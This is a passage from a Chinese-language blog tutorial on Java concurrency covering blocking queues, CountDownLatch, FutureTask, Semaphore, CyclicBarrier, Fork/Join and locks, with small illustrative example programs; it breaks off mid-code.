<code>ConcurrentHashMap</code>使用<code>锁分段</code>的思想，将原来的一个锁应用在整个容器上拆分为多个锁每个锁锁定容器一部分数据的形式。这能减少锁竞争，提高程序的可伸缩性。</p></li></ul><h4 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h4><p>Queue、Deque</p><table><thead><tr><th>-</th><th>-</th><th>-</th></tr></thead><tbody><tr><td>add</td><td>增加一个元索</td><td>如果队列已满，则抛出一个IIIegaISlabEepeplian异常</td></tr><tr><td>remove</td><td>移除并返回队列头部的元素</td><td>如果队列为空，则抛出一个NoSuchElementException异常</td></tr><tr><td>element</td><td>返回队列头部的元素</td><td>如果队列为空，则抛出一个NoSuchElementException异常</td></tr><tr><td>offer</td><td>添加一个元素并返回true</td><td>如果队列已满，则返回false</td></tr><tr><td>poll</td><td>移除并返问队列头部的元素</td><td>如果队列为空，则返回null</td></tr><tr><td>peek</td><td>返回队列头部的元素</td><td>如果队列为空，则返回null</td></tr><tr><td>put</td><td>添加一个元素</td><td>如果队列满，则阻塞</td></tr><tr><td>take</td><td>移除并返回队列头部的元素</td><td>如果队列为空，则阻塞</td></tr></tbody></table><ul><li><p>LinkedBlockingQueue</p><p>  底层有链表实现。</p></li><li><p>ArrayBlockingQueue</p><p>  底层有数组实现。</p></li><li><p>DelayQueue</p><p>  延迟队列，只有延迟期满时才能从中提取元素。</p></li><li><p>SynchronousQueue </p><p>  <code>SynchronousQueue</code>并不是一个真正的队列，它没有存储功能，不缓存元素。它维护的是是一组工作线程，任务直接从生产者到消费者手中，中间没有延迟。<code>newCachedThreadPool</code>使用的正是这种队列。</p></li></ul><h4 id="同步工具类"><a href="#同步工具类" class="headerlink" title="同步工具类"></a>同步工具类</h4><ul><li><p>CountDownLatch</p><ul><li>确保某个计算在其需要的所有资源都被初始化之后才继续执行。</li><li>确保某个服务在其所依赖的其它所有服务都启动后才启动。</li><li>等待知道某个动作的所有参与者都就绪再继续执行。</li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 模拟田径比赛</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Track</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="comment">// 发令枪</span></span><br><span class="line">        <span class="type">CountDownLatch</span> <span class="variable">startingGun</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            <span class="comment">// runner code</span></span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> i;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// runner</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                System.out.printf(<span class="string">&quot;Runner-%d 准备好了\n&quot;</span>, number);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    startingGun.await(); <span class="comment">// 所有线程到这里开始等待一起执行</span></span><br><span class="line">                    start = System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 随机跑步时间</span></span><br><span class="line">                    Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException ignore) &#123; &#125;</span><br><span class="line"></span><br><span class="line">                System.out.printf(<span class="string">&quot;Runner-%d 用时：%d ms\n&quot;</span>, number, System.currentTimeMillis() - start);</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        startingGun.countDown(); <span class="comment">// startingGun </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>FutureTask    </p><p>  多个耗时的任务可以异步执行，通过<code>get</code>拿到执行后的结果。任务只会执行一次，最终状态不会改变（类似Promise）。</p><p>  <img src="/images/FutureTask.png"><br>  <img src="/images/future.png"></p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FutureTaskTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        Callable&lt;Integer&gt; callable = () -&gt; &#123;</span><br><span class="line">            <span class="comment">// 模拟计算耗时</span></span><br><span class="line">            Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">            <span class="comment">// 返回结果</span></span><br><span class="line">            <span class="keyword">return</span> random.nextInt(<span class="number">10</span>);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        FutureTask&lt;Integer&gt; queryOne = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(callable);</span><br><span class="line">        FutureTask&lt;Integer&gt; queryTwo = <span class="keyword">new</span> <span class="title class_">FutureTask</span>&lt;&gt;(callable);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(queryOne).start();</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(queryTwo).start();</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 未执行完的情况下，get时会阻塞。</span></span><br><span class="line">            <span class="comment">// 最终执行时间取决于执行时间最长的任务。</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">revOne</span> <span class="operator">=</span> queryOne.get();</span><br><span class="line">            <span class="type">int</span> <span class="variable">revTwo</span> <span class="operator">=</span> queryTwo.get();</span><br><span class="line">            System.out.printf(<span class="string">&quot;%d + %d = %d\n&quot;</span>, revOne, revTwo, revOne + revTwo);</span><br><span class="line">            System.out.println(queryOne.get() + queryTwo.get());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException ignore) &#123;</span><br><span class="line">            <span class="comment">// e.printStackTrace();</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExecutionException e) &#123;</span><br><span class="line">            <span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> e.getCause();</span><br><span class="line">            <span class="comment">//if (cause instanceof ) &#123;</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">//&#125; else &#123;</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">//&#125;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Semaphore    </p><p>  Semaphore中管理者一组虚拟的许可证，许可证的数量通过构造函数指定。获得操作前只有获得许可证后才能继续执行，执行结束后释放许可证。常用于连接池等类似的场景。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 模拟银行窗口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BankWindow</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="comment">// 共六个窗口工作</span></span><br><span class="line">        <span class="type">Semaphore</span> <span class="variable">window</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Semaphore</span>(<span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 共20个顾客在排队办理</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.printf(<span class="string">&quot;顾客%d等待中..\n&quot;</span>, number);</span><br><span class="line">                    window.acquire(); <span class="comment">// 获得一个牌</span></span><br><span class="line">                    System.out.printf(<span class="string">&quot;开始为顾客%d办理业务\n&quot;</span>, number);</span><br><span class="line">                    Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line">                    System.out.printf(<span class="string">&quot;顾客%d办理完成\n&quot;</span>, number);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException ignore) &#123;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    window.release(); <span class="comment">// 归还牌 </span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Barrier </p><p>  同<code>CountDownLatch</code>不同的地方是<code>CyclicBarrier</code>是先干后集合，而<code>CountDownLatch</code>一般是先集合后开始干。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 模拟银行金库。</span></span><br><span class="line"><span class="comment">// 金库大门共三把锁，分别有三个经理拿着钥匙。</span></span><br><span class="line"><span class="comment">// 只有三个经理人都开锁时，金库大门才会开。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BankVault</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">lockNumber</span> <span class="operator">=</span> <span class="number">3</span>;</span><br><span class="line">        <span class="comment">// 保险库大门有三把锁</span></span><br><span class="line">        <span class="type">CyclicBarrier</span> <span class="variable">bankVaultDoor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CyclicBarrier</span>(lockNumber, () -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;金库已开&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; lockNumber; i++) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="comment">// 经理人</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    System.out.printf(<span class="string">&quot;经理%d开始开锁\n&quot;</span>, number);</span><br><span class="line">                    <span class="comment">// 模拟每个经理人的开锁时间</span></span><br><span class="line">                    Thread.sleep(random.nextInt(<span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line">                    System.out.printf(<span class="string">&quot;经理%d开始开锁完成\n&quot;</span>, number);</span><br><span class="line">                    <span class="comment">// 开锁</span></span><br><span class="line">                    bankVaultDoor.await();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException ignore) &#123;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (BrokenBarrierException e) &#123;</span><br><span class="line">                    <span class="comment">//await中断</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ForkJoin</p><p>  ForkJoin采用分治算法，将大任务拆分成小任务来处理。通常情况下我们不需要直接继承ForkJoinTask类，而只需要继承它的子类，Fork&#x2F;Join框架提供了以下两个子类：</p><ul><li>RecursiveAction：用于没有返回结果的任务。</li><li>RecursiveTask ：用于有返回结果的任务。</li></ul><p>  常用模式（分治）：<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Result <span class="title function_">solve</span><span class="params">(Problem problem)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (problem is small) &#123;</span><br><span class="line">        <span class="comment">// 直接解决</span></span><br><span class="line">        directly solve problem</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 拆分问题</span></span><br><span class="line">        split problem into independent parts</span><br><span class="line">        fork <span class="keyword">new</span> <span class="title class_">subtasks</span> to solve each part</span><br><span class="line">        join all subtasks</span><br><span class="line">        compose result from subresults</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>  Fork&#x2F;Join求和<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ForkJoinSum</span> <span class="keyword">extends</span> <span class="title class_">RecursiveTask</span>&lt;Long&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] nums;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> low;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> high;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">THRESHOLD</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ForkJoinSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(nums, <span class="number">0</span>, nums.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ForkJoinSum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> low, <span class="type">int</span> high)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.nums = nums;</span><br><span class="line">        <span class="built_in">this</span>.low = low;</span><br><span class="line">        <span class="built_in">this</span>.high = high;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Long <span class="title function_">compute</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 小任务直接处理</span></span><br><span class="line">        <span class="keyword">if</span> (high - low &lt; THRESHOLD) &#123;</span><br><span class="line">            <span class="keyword">return</span> Arrays.stream(Arrays.copyOfRange(nums, low, high)).asLongStream().sum();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 大人物先拆分再合并结果</span></span><br><span class="line">            <span class="type">ForkJoinSum</span> <span class="variable">left</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ForkJoinSum</span>(nums, low, low + (high - low) / <span class="number">2</span>);</span><br><span class="line">            <span class="type">ForkJoinSum</span> <span class="variable">right</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ForkJoinSum</span>(nums, low + (high - low) / <span class="number">2</span>, high);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 注意：不要两个线程都fork，不然当前线程将无任务可做。</span></span><br><span class="line">            <span class="comment">// invokeAll其中left会在当前线程内执行，right会fork在线程池中另一个线程中执行。</span></span><br><span class="line">            invokeAll(left, right);</span><br><span class="line">            <span class="keyword">return</span> left.join() + right.join();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">        <span class="type">int</span>[] nums = <span class="keyword">new</span> <span class="title class_">int</span>[count];</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; count; i++) nums[i] = random.nextInt(count);</span><br><span class="line"></span><br><span class="line">        <span class="type">ForkJoinPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ForkJoinPool</span>(<span class="number">4</span>); <span class="comment">// 最大并发数4</span></span><br><span class="line">        <span class="type">ForkJoinSum</span> <span class="variable">task</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ForkJoinSum</span>(nums);</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">ret</span> <span class="operator">=</span> pool.invoke(task);</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></li></ul><h3 id="锁"><a href="#锁" class="headerlink" title="锁"></a>锁</h3><ul><li><p>内置锁 </p><p>  内置锁能同时保证<code>原子性</code>和<code>可见性</code>。内置锁是独占锁，会增加串行代码比例，降低程序的可伸缩性。</p><p>  内置锁是一种可重入锁，如果已经获得了锁，后面在遇到相同的锁时可以直接进入。</p><p>  是用不用的锁组合时一定要注意加锁的顺序，避免交叉造成死锁的问题。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 锁为实例(this)对象 </span></span><br><span class="line"><span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">fun</span><span class="params">()</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 特定的锁对象，可以将锁对象封闭在程序内部。</span></span><br><span class="line"><span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 锁为class对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="title function_">fun</span><span class="params">()</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>ReentrantLock </p><p>  <code>ReentrantLock</code>提供了和<code>synchronized</code>一样的互斥性及内存可见性。在大多数场景下使用<code>synchronized</code>就够了，但是内置锁有一些局限性。例如，我们无法中断一个等待获取锁的线程。但是使用<code>ReentrantLock</code>也有缺点，我们必须手动释放锁。<code>ReentrantLock</code>和内置锁性能相当，仅当内置锁不能满足需求时才考虑使用<code>ReentrantLock</code>。就性能而言，我们也应当首选内置锁，因为内置锁的JVM的内置属性，它能执行一些优化。</p><p>  <code>ReentrantLock</code>可以提供公平锁，线程按照它们发出请求的顺序来获得锁。非公平锁允许<code>插队</code>行为，当请求一把非公平锁时，如果在发出请求时同时改锁状态变为可用，那么这个线程将跳过所有等待线程而获得这个锁。由于公平锁所有线程在等待锁时都要排队，这将会增加线程切换降低性能，而<code>插队</code>将减少一次上下文切换。当持有锁的时间较长时，应该使用公平锁。</p><p>  <code>ReentrantLock</code>实现了<code>Lock</code>接口。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Lock</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得一把锁</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">lock</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得一把锁，锁获取时可以中断</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">lockInterruptibly</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取一把锁，获得返回true</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试获得一把锁，等待一定的时间（获取锁时可中断）。获得返回true</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(<span class="type">long</span> time, TimeUnit unit)</span> <span class="keyword">throws</span> InterruptedException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放锁</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">unlock</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 条件队列</span></span><br><span class="line">    Condition <span class="title function_">newCondition</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  组合运用</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConcurrentIncrease</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">total</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">ReentrantLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">incr</span><span class="params">()</span> &#123;</span><br><span class="line">        lock.lock();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ++total;</span><br><span class="line">            <span class="comment">// 内部输出后会发生IO阻塞，会放弃CPU资源</span></span><br><span class="line">            <span class="comment">// System.out.printf(&quot;total: %d\n&quot;, total);</span></span><br><span class="line">            <span class="keyword">return</span> total;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            lock.unlock();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ConcurrentIncrease</span> <span class="variable">increase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConcurrentIncrease</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">CountDownLatch</span> <span class="variable">start</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(count);</span><br><span class="line">        <span class="type">CyclicBarrier</span> <span class="variable">done</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CyclicBarrier</span>(count, () -&gt; &#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;total: %d\n&quot;</span>, increase.total);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span 